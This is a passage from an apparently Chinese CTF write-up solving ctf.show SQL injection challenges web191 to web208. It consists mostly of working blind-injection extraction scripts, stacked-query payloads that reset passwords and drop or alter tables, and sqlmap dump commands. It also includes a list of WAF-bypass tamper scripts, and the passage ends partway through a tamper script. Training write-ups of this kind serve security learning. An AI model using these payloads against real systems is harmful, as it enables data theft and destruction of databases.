url<span class="token operator">=</span><span class="token string">"http://90dee32b-d615-46f6-b306-0a48a96c9f3d.challenge.ctf.show/api/index.php"</span>
flag<span class="token operator">=</span><span class="token string">''</span>
i<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
    head<span class="token operator">=</span><span class="token number">32</span>
    tail<span class="token operator">=</span><span class="token number">127</span>
    <span class="token keyword">while</span> head<span class="token operator">&lt;</span>tail<span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span>
        <span class="token comment">#查表名 ctfshow_fl0g,ctfshow_user</span>
        <span class="token comment">#payload="select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment">#查字段 id,f1ag</span>
        <span class="token comment">#payload="select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        payload<span class="token operator">=</span><span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>
 
        data<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,1,2)=1#"</span></span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span>
        <span class="token punctuation">}</span>
        rep<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
 
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail<span class="token operator">=</span>mid
 
    <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">32</span><span class="token punctuation">:</span>
        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web191_319"></a>web191</h2> 
<p>ASCII被过滤了，用ord代替<br> 同上。</p> 
<h2><a id="web192_322"></a>web192</h2> 
<blockquote> 
 <p>chr()函数<br> 可以是10进制也可以是16进制的形式的数字。<br> 返回值：返回值是当前整数对应的 ASCII 字符。<br> ord()函数<br> 返回ASCII字符对应十进制</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/48/c8/5FhZvo2Z_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://9333d82a-a9d7-4050-a9bd-3bec243c99bd.challenge.ctf.show//api/'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
flagstr <span class="token operator">=</span> <span class="token string">'ctfshow{abdegijklmnpqruvxyz-0123456789}'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        <span class="token comment">#查表名</span>
        <span class="token comment">#payload="admin' and (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}')#".format(i,mid)</span>
        <span class="token comment">#查字段</span>
        <span class="token comment">#payload = "admin' and (substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1)='{}')#".format(i,mid)</span>
        payload <span class="token operator">=</span> <span class="token string">"admin' and (substr((select f1ag from ctfshow_fl0g),{},1)='{}')#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'8bef'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> mid
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web193_353"></a>web193</h2> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://800a4165-39dd-4faf-9333-a8db3c579571.challenge.ctf.show/api/"</span>
flag<span class="token operator">=</span><span class="token string">''</span>
tempstr <span class="token operator">=</span> <span class="token string">''</span>
flagstr<span class="token operator">=</span><span class="token string">',ctfshow{abdegijklmnpqruvxyz-0123456789}'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        <span class="token comment">#payload = "admin'and (left((select database()),{})='{}')#".format(i,tempstr+mid)</span>

        <span class="token comment">#payload = "admin'and (left((select group_concat(table_name) from information_schema.tables where table_schema=database()),{})='{}')#".format(i,tempstr+mid)</span>

        <span class="token comment">#payload = "admin'and (left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),{})='{}')#".format(i,tempstr+mid)</span>

        payload <span class="token operator">=</span> <span class="token string">"admin'and (left((select f1ag from ctfshow_flxg),{})='{}')#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>

        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            tempstr <span class="token operator">+=</span> mid
            flag <span class="token operator">+=</span> mid
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web194_381"></a>web194</h2> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://0dd7b3dc-3339-4637-8c07-bb631b08d95d.challenge.ctf.show/api/"</span>
flag<span class="token operator">=</span><span class="token string">''</span>
tempstr <span class="token operator">=</span> <span class="token string">''</span>
flagstr<span class="token operator">=</span><span class="token string">',ctfshow{abdegijklmnpqruvxyz-0123456789}'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        <span class="token comment">#payload = "admin'and (left((select database()),{})='{}')#".format(i,tempstr+mid)</span>

        <span class="token comment">#payload = "admin'and (left((select group_concat(table_name) from information_schema.tables where table_schema=database()),{})='{}')#".format(i,tempstr+mid)</span>

        <span class="token comment">#payload = "admin'and (left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),{})='{}')#".format(i,tempstr+mid)</span>

        payload <span class="token operator">=</span> <span class="token string">"admin'and (lpad((select f1ag from ctfshow_flxg),{},'')='{}')#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>

        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            tempstr <span class="token operator">+=</span> mid
            flag <span class="token operator">+=</span> mid
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web195_409"></a>web195</h2> 
<p>重置表中密码</p> 
<pre><code class="prism language-python"><span class="token number">1</span><span class="token punctuation">;</span>update`ctfshow_user`<span class="token builtin">set</span>`<span class="token keyword">pass</span>`<span class="token operator">=</span><span class="token number">1</span>

username<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<p>查询用户为0是因为0能因为sql语句查询中十六进制能和任何字母进行弱类型匹配</p> 
<h2><a id="web196_417"></a>web196</h2> 
<p><img src="https://images2.imgbox.com/84/e5/LtvoDLvw_o.png" alt="在这里插入图片描述"><br> <code>username=1;select(1)&amp;password=1</code></p> 
<h2><a id="web197_420"></a>web197</h2> 
<pre><code class="prism language-bash"><span class="token number">0</span><span class="token punctuation">;</span>drop table ctfshow_user<span class="token punctuation">;</span> create table ctfshow_user<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>,<span class="token variable"><span class="token variable">`</span>pass<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">))</span><span class="token punctuation">;</span> insert ctfshow_user<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>pass<span class="token variable">`</span></span><span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token number">1,2</span><span class="token punctuation">)</span>
</code></pre> 
<p>先删除表，然后重新创建并且插入数据<br> <code>username=1&amp;password=2</code></p> 
<h2><a id="web198_426"></a>web198</h2> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">'http://6966082a-8fc3-478e-b49b-98e72c3bfa92.challenge.ctf.show/api/'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change pass id varchar(255);alter table ctfshow_user change id ffff varvchar(255);'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web199web200_447"></a>web199-web200</h2> 
<p><code>username=0;show tables</code><br> <code>password=ctfshow_user</code></p> 
<h2><a id="web201_450"></a>web201</h2> 
<h3><a id="sqlmap_451"></a>使用sqlmap</h3> 
<h4><a id="_452"></a>爆库</h4> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id="</span>  --user-agent<span class="token operator">=</span>sqlmap --referer<span class="token operator">=</span>ctf.show --dbs
</code></pre> 
<h4><a id="_456"></a>爆表</h4> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id="</span>  --user-agent<span class="token operator">=</span>sqlmap --referer<span class="token operator">=</span>ctf.show -D ctfshow_web --tables
</code></pre> 
<h4><a id="_460"></a>爆列名</h4> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id="</span>  --user-agent<span class="token operator">=</span>sqlmap --referer<span class="token operator">=</span>ctf.show -D ctfshow_web -T ctfshow_user --columns
</code></pre> 
<h4><a id="_464"></a>爆字段</h4> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id="</span>  --user-agent<span class="token operator">=</span>sqlmap --referer<span class="token operator">=</span>ctf.show -D ctfshow_web -T ctfshow_user --dump
</code></pre> 
<h2><a id="web202_468"></a>web202</h2> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>fcef3bbc<span class="token operator">-</span>e7a2<span class="token operator">-</span>4ea3<span class="token operator">-</span>8f41<span class="token operator">-</span>cd3a93cfc00c<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token punctuation">.</span>php <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>us
er<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_user <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web203_473"></a>web203</h2> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>08d77122<span class="token operator">-</span>b80d<span class="token operator">-</span>49b0<span class="token operator">-</span>85d5<span class="token operator">-</span>42c346888722<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token punctuation">.</span>php <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>put <span class="token operator">-</span><span class="token operator">-</span>header<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_user <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web204_477"></a>web204</h2> 
<p>添加cookie</p> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>961b7f7b<span class="token operator">-</span>d646<span class="token operator">-</span><span class="token number">4823</span><span class="token operator">-</span>88b2<span class="token operator">-</span>aceead519fe4<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token punctuation">.</span>php <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>put <span class="token operator">-</span><span class="token operator">-</span>header<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=1koef7it9pk0fo0b62tk2888tb"</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_user <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web205_482"></a>web205</h2> 
<p><code>--safe-url=SAFEURL 设置在测试目标地址前访问的安全链接</code><br> <code> --safe-freq=SAFE.. 设置两次注入测试前访问安全链接的次数</code></p> 
<pre><code class="prism language-python"> python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://16dcba9d-29e0-4ba8-9a83-f5fbd574609e.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span>  <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap  <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=s3vh3s8cv9tjren9qu2vn9tli2"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>header<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flax <span class="token operator">-</span><span class="token operator">-</span>dump  <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://16dcba9d-29e0-4ba8-9a83-f5fbd574609e.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<h2><a id="web206_488"></a>web206</h2> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://b49bc049-2226-4f1e-96e1-97f3bdaf4917.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span>  <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap  <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=7bj5rc70mnlm593mpr8t47i9fp"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>header<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flaxc  <span class="token operator">-</span><span class="token operator">-</span>dump <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://b49bc049-2226-4f1e-96e1-97f3bdaf4917.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<h2><a id="web207_492"></a>web207</h2> 
<p><code>--tamper</code></p> 
<pre><code class="prism language-python">space2comment<span class="token punctuation">.</span>py用<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>代替空格
 
apostrophemask<span class="token punctuation">.</span>py用utf8代替引号
 
equaltolike<span class="token punctuation">.</span>pylike代替等号
 
space2dash<span class="token punctuation">.</span>py　绕过过滤‘<span class="token operator">=</span>’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
 
greatest<span class="token punctuation">.</span>py　绕过过滤’<span class="token operator">&gt;</span>’ <span class="token punctuation">,</span>用GREATEST替换大于号。
 
space2hash<span class="token punctuation">.</span>py空格替换为<span class="token comment">#号,随机字符串以及换行符</span>
 
apostrophenullencode<span class="token punctuation">.</span>py绕过过滤双引号，替换字符和双引号。
 
halfversionedmorekeywords<span class="token punctuation">.</span>py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
 
space2morehash<span class="token punctuation">.</span>py空格替换为 <span class="token comment">#号 以及更多随机字符串 换行符</span>
 
appendnullbyte<span class="token punctuation">.</span>py在有效负荷结束位置加载零字节字符编码
 
ifnull2ifisnull<span class="token punctuation">.</span>py　绕过对IFNULL过滤<span class="token punctuation">,</span>替换类似’IFNULL<span class="token punctuation">(</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span>’为’IF<span class="token punctuation">(</span>ISNULL<span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">,</span> B<span class="token punctuation">,</span> A<span class="token punctuation">)</span>’
 
space2mssqlblank<span class="token punctuation">.</span>py<span class="token punctuation">(</span>mssql<span class="token punctuation">)</span>空格替换为其它空符号
 
base64encode<span class="token punctuation">.</span>py　用base64编码替换
 
space2mssqlhash<span class="token punctuation">.</span>py　替换空格
 
modsecurityversioned<span class="token punctuation">.</span>py过滤空格，包含完整的查询版本注释
 
space2mysqlblank<span class="token punctuation">.</span>py　空格替换其它空白符号<span class="token punctuation">(</span>mysql<span class="token punctuation">)</span>
 
between<span class="token punctuation">.</span>py用between替换大于号（<span class="token operator">&gt;</span>）
 
space2mysqldash<span class="token punctuation">.</span>py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
 
multiplespaces<span class="token punctuation">.</span>py围绕SQL关键字添加多个空格
 
space2plus<span class="token punctuation">.</span>py用<span class="token operator">+</span>替换空格
 
bluecoat<span class="token punctuation">.</span>py代替空格字符后与一个有效的随机空白字符的SQL语句<span class="token punctuation">,</span>然后替换<span class="token operator">=</span>为like
 
nonrecursivereplacement<span class="token punctuation">.</span>py双重查询语句<span class="token punctuation">,</span>取代SQL关键字
 
space2randomblank<span class="token punctuation">.</span>py代替空格字符（“”）从一个随机的空白字符可选字符的有效集
 
sp_password<span class="token punctuation">.</span>py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
 
chardoubleencode<span class="token punctuation">.</span>py双url编码<span class="token punctuation">(</span>不处理以编码的<span class="token punctuation">)</span>
 
unionalltounion<span class="token punctuation">.</span>py替换UNION ALLSELECT UNION SELECT
 
charencode<span class="token punctuation">.</span>py　url编码
 
randomcase<span class="token punctuation">.</span>py随机大小写
 
unmagicquotes<span class="token punctuation">.</span>py宽字符绕过 GPCaddslashes
 
randomcomments<span class="token punctuation">.</span>py用<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>分割sql关键字
 
charunicodeencode<span class="token punctuation">.</span>py字符串 <span class="token builtin">unicode</span> 编码
 
securesphere<span class="token punctuation">.</span>py追加特制的字符串
 
versionedmorekeywords<span class="token punctuation">.</span>py注释绕过
 
space2comment<span class="token punctuation">.</span>py替换空格字符串<span class="token punctuation">(</span>‘‘<span class="token punctuation">)</span> 使用注释‘<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>’
 
halfversionedmorekeywords<span class="token punctuation">.</span>py关键字前加注释
</code></pre> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/index.php"</span> --user-agent<span class="token operator">=</span>sqlmap --method<span class="token operator">=</span>PUT --data <span class="token string">"id=1"</span> --referer<span class="token operator">=</span>ctf.show --headers<span class="token operator">=</span>Content-Type:text/plain --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=0s10857oppg126l47tnkfvgdnt"</span> --safe-url<span class="token operator">=</span><span class="token string">"http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> --tamper<span class="token operator">=</span>space2comment -D ctfshow_web -T ctfshow_flaxca --dump
</code></pre> 
<h2><a id="web208_569"></a>web208</h2> 
<p><code>过滤了select</code></p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

